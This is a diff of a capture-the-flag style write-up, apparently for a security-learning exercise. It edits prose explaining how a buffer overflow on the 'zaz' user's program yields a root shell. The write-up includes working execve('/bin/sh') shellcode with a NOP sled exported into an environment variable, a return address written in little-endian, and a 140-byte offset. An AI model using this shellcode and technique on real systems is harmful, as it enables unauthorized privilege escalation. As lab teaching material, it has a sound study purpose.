@@ -4,15 +4,13 @@ This is an alternative way to obtain a root shell from the zaz user.
 
 We will use the buffer overflow again. This time we are not trying to access the `/bin/sh` address. Instead we will use a shellcode to open the root shell.
 
-We will even work our way as if there were canary protection against stack address modifications.
-
-First let's inject our shellcode inside an environement variable, this way we will be able to point our program to this variable later, instead of directly injecting the shellcode in the buffer overflow, and modifying the stack.
+First let's inject our shellcode inside an environement variable, this way we will be able to point our program to this variable later, instead of directly injecting the shellcode in the buffer overflow.
 
 ```
 export SHELLCODE=`python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
 ```
 
-Our shellcode also has 900 `\x90` inside it, called "nop", it will help us for "aiming" at the right address and avoid memory padding problems. Once we manage to point inside the Nops, the programm will jump from nop to nop until it find the beginning of our shellcode.
+Our shellcode also has 900 `\x90` inside it, called "nop", it will help us for "aiming" at the right address and avoid memory padding problems. Once we manage to point inside the Nops, the program will jump from nop to nop until it find the beginning of our shellcode.
 
 Let's find the address of our "SHELLCODE" environment variable.
 
@@ -91,7 +89,7 @@ This will show us the most recent environment variable, which is SHELLCODE. Now 
 0xbffff92f:     0x622f6e69622f3d4c      0x4d52455400687361
 ```
 
-Let's pick the address : `0xbffff73f` who is located in the middle of the nopsled. Now we translate for the asm : `\x3f\xf7\xff\xbf`
+Let's pick the address : `0xbffff73f` who is located in the middle of the nopsled. Now we translate the address in little endian : `\x3f\xf7\xff\xbf`
 
 As explained the writeup2.md, the buffer overflow offset is 140, so we will use that knowledge in our input.
 We will make the program to the SHELLCODE variable with the buffer overflow, who will execute our shellcode:
